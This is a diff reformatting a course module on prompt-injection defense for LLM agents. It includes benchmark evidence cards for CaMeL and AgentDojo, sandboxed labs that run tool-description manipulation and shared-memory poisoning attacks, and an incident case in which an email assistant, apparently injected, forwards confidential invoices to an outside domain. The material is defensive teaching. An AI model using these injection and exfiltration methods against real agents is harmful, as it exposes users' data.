-- *Metric/baseline/result*: task success versus same model's native tool-calling API. Table 2 native → CaMeL: o3 high 84.5→77.3%; o4-mini 79.4→76.3%; Claude 4 Sonnet 86.6→74.2%; Gemini 2.5 Pro 73.2→41.2%; Gemini 2.5 Flash 55.7→35.1%. Table 4 successful attacks out of 949: 0 for o3/Gemini Pro, 1 for o4-mini, 11 for Claude 4 Sonnet. Median token ratios 2.82× input and 2.73× output.
-- *Status/limits*: author-reported, not reproduced. Table 2's caption does not define its ± values (re-checked 2026-11-09); they are not interpreted here. Text-only attacks are out of scope; side channels remain; interpreter verification is future work; data-dependent actions reduce utility.
+- *Metric/baseline/result*: task success versus same model's native tool-calling API.
+  - Table 2 native → CaMeL: o3 high 84.5→77.3%; o4-mini 79.4→76.3%; Claude 4 Sonnet 86.6→74.2%; Gemini 2.5 Pro 73.2→41.2%; Gemini 2.5 Flash 55.7→35.1%.
+  - Table 4 successful attacks out of 949: 0 for o3/Gemini Pro, 1 for o4-mini, 11 for Claude 4 Sonnet.
+  - Median token ratios 2.82× input and 2.73× output.
+- *Status/limits*: author-reported, not reproduced.
+  - Table 2's caption does not define its ± values (re-checked 2026-11-09); they are not interpreted here.
+  - Text-only attacks are out of scope; side channels remain; interpreter verification is future work; data-dependent actions reduce utility.
 
 *EC-5 — AgentDojo* (CLM-013)
 - *Version/full-text pointers*: arXiv:2406.13352v3, 24 Nov 2024; §§3–5; Tables 1, 3–5.
@@ -761,7 +1079,12 @@ The cards below were read on 2026-10-01 in arXiv HTML full text. All are author-
 **PRODUCTION SOURCE TRACE**
 - Repository/revision: `ethz-spylab/agentdojo` at `089ed468cf3ed0322acc66b0211f26d9d90dbf60`.
 - Verification: static inspection 2026-09-27; every file and symbol listed here re-read at that revision 2026-10-01. Not executed.
-- Files/symbols: `src/agentdojo/benchmark.py::{run_task_with_injection_tasks, benchmark_suite_with_injections, aggregate_results}`; `src/agentdojo/task_suite/task_suite.py::TaskSuite.run_task_with_pipeline`; `src/agentdojo/base_tasks.py::BaseInjectionTask.security`; `src/agentdojo/agent_pipeline/pi_detector.py::{PromptInjectionDetector.query, PromptInjectionDetector.transform, TransformersBasedPIDetector.detect}`; `src/agentdojo/agent_pipeline/tool_execution.py::{ToolsExecutor.query, ToolsExecutionLoop.query}`.
+- Files/symbols:
+  - `src/agentdojo/benchmark.py::{run_task_with_injection_tasks, benchmark_suite_with_injections, aggregate_results}`
+  - `src/agentdojo/task_suite/task_suite.py::TaskSuite.run_task_with_pipeline`
+  - `src/agentdojo/base_tasks.py::BaseInjectionTask.security`
+  - `src/agentdojo/agent_pipeline/pi_detector.py::{PromptInjectionDetector.query, PromptInjectionDetector.transform, TransformersBasedPIDetector.detect}`
+  - `src/agentdojo/agent_pipeline/tool_execution.py::{ToolsExecutor.query, ToolsExecutionLoop.query}`
 - *Scope*: one benchmark-harness snapshot, not a claim about other revisions or production frameworks.
 
 ---
@@ -770,7 +1093,16 @@ The cards below were read on 2026-10-01 in arXiv HTML full text. All are author-
 
 ## 06 Engineering Labs
 
-All labs follow `PREDICT → BUILD → MEASURE → EXPLAIN → BREAK → IMPROVE → FALSIFY` in an isolated sandbox with mock tools. Corpora, canaries, prices, and endpoints are synthetic. Hosts use reserved names answered only by the sandbox resolver. Rates describe only the fixture and selected model.
+All labs follow `PREDICT → BUILD → MEASURE → EXPLAIN → BREAK → IMPROVE → FALSIFY` in an isolated sandbox with mock tools:
+
+```mermaid
+flowchart LR
+    P["PREDICT"] --> B["BUILD"] --> M["MEASURE"] --> E["EXPLAIN"] --> BR["BREAK"] --> I["IMPROVE"] --> F["FALSIFY"]
+```
+
+- Corpora, canaries, prices, and endpoints are synthetic.
+- Hosts use reserved names answered only by the sandbox resolver.
+- Rates describe only the fixture and selected model.
 
 ### LAB A — Source–Sink Threat Model
 - **Objective**: Produce a data-flow diagram, trust boundaries, source/sink inventory, credentials, and attack-path list for a sandbox email/files/banking agent.
@@ -808,7 +1140,11 @@ All labs follow `PREDICT → BUILD → MEASURE → EXPLAIN → BREAK → IMPROVE
 - **Independent Variables**: Gateway rules, detector, egress configuration, ledger key, sandbox network policy.
 - **Dependent Variables**: ASR by path, utility, confirmation, audit completeness, unauthorized listener/resolver requests, maximum cost per principal.
 - **Measurements**: E1–E7/C0/C1 resolver and listener logs; ledger tests for multi-tool iteration, nested retry, context growth, budget rejection, and restart across episodes.
-- **Extension — agent channels** (0.5h): run two rows of the Lesson 18.4 attack-to-defense table against the gateway in the sandbox. (1) A mock tool server whose description asks for a different legitimate tool or a changed argument, and a second load with the description altered after pinning. (2) A memory store shared by two sandbox principals, where the attacker principal writes records through ordinary queries. Report dispatched calls outside capability, refused manifest changes, and victim-query outcomes with and without per-principal partition, under a stated number of description rewrites or attacker queries. Use canary data and mock servers only.
+- **Extension — agent channels** (0.5h): run two rows of the Lesson 18.4 attack-to-defense table against the gateway in the sandbox.
+  1. A mock tool server whose description asks for a different legitimate tool or a changed argument, and a second load with the description altered after pinning.
+  2. A memory store shared by two sandbox principals, where the attacker principal writes records through ordinary queries.
+  - Report dispatched calls outside capability, refused manifest changes, and victim-query outcomes with and without per-principal partition, under a stated number of description rewrites or attacker queries.
+  - Use canary data and mock servers only.
 - **Break & Falsify**: Any unauthorized lookup/request in E1–E5 falsifies proxy. Any $C+R>B$, dispatch after rejection, or ledger key changed by document/tool content falsifies ledger. Any call outside capability dispatched in the extension falsifies the derived control for that channel (CLM-033).
 - **Alignment**: Lessons 18.4–18.5 and Incident 18.1.
 - **Effort Estimate**: 2.5h build, 1h analysis, 0.5h agent-channel extension (4h total).
@@ -819,7 +1155,11 @@ All labs follow `PREDICT → BUILD → MEASURE → EXPLAIN → BREAK → IMPROVE
 
 ### Incident 18.1 — The Helpful Forwarder
 
-- **Incident Symptoms**: A customer reports that confidential invoices appeared at an external address. The assistant's logs show normal summaries; no alert fired from the injection detector; the send-email tool shows three calls to a new domain over two days, each following a user request to "summarize my latest emails." The model provider reports no incident.
+- **Incident Symptoms**:
+  - A customer reports that confidential invoices appeared at an external address.
+  - The assistant's logs show normal summaries; no alert fired from the injection detector.
+  - The send-email tool shows three calls to a new domain over two days, each following a user request to "summarize my latest emails."
+  - The model provider reports no incident.
 - **Diagnostic Protocol (Task)**:
   1. *Formulate Competing Hypotheses*: indirect injection in an email body; compromised user account; malicious browser extension; rendered-image exfiltration; tool misconfiguration; insider action.
   2. *Rank Initial Plausibility*: Use the correlation between summarization requests and send calls; do not assume injection without context evidence.
@@ -915,6 +1255,12 @@ A learner must be able to:
 ### Module Wrap-Up (Final Mental Model Reconstruction)
 - **Core invariant**: security holds even when model is fooled.
 - **Path**: untrusted source → context → proposed action → principal/provenance/risk/budget check → sandboxed, destination-authorized, budgeted, audited effect.
+
+```mermaid
+flowchart LR
+    US["untrusted source"] --> CX["context"] --> PA["proposed action"] --> CK["principal / provenance /<br/>risk / budget check"] --> EF["sandboxed, destination-authorized,<br/>budgeted, audited effect"]
+```
+
 - Detectors lower probabilities; architecture removes paths. Evaluate after attacker adapts.
 - A number needs denominator, protocol, baseline. A ceiling is a bound only when every factor is enforced.
 
